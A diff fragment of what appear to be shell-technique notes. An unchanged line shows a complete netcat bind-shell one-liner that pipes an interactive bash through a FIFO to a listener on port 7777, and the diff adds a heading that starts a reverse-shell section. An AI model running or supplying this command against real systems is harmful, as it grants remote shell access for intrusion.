@@ -66,3 +66,7 @@ so the whole thing becomes
 ```bash
 rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.10.10.10 7777 > /tmp/f
 ```
+
+
+REVERSE SHELL 
+The target acts as a client
